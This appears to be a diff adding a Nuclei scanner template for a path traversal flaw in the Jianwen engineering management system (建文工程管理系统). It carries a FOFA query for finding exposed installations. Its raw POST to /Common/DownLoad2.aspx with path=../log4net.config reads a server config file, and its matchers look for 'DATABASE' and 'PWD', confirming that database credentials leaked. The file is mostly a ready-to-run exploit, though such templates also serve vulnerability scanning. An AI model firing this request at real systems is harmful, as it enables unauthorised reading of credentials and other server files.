@@ -1,0 +1,31 @@
+id: jianwen-system-download2aspx-arbitrary-file-read
+
+info:
+  name: 建文工程管理系统 DownLoad2.aspx 路径遍历漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="Login/QRLogin.ashx"
+          建文工程管理系统 DownLoad2.aspx 接口存在文件访问控制缺陷，攻击者可通过构造恶意请求绕过文件访问限制，读取服务器文件系统中的任意文件，导致敏感信息泄露，包括但不限于客户数据、配置文件及系统源代码。
+  tags: 建文工程管理系统
+
+http:
+- raw:
+  - |
+    POST /Common/DownLoad2.aspx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    path=../log4net.config&Name=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'DATABASE'
+  - type: word
+    part: body
+    words:
+    - 'PWD'
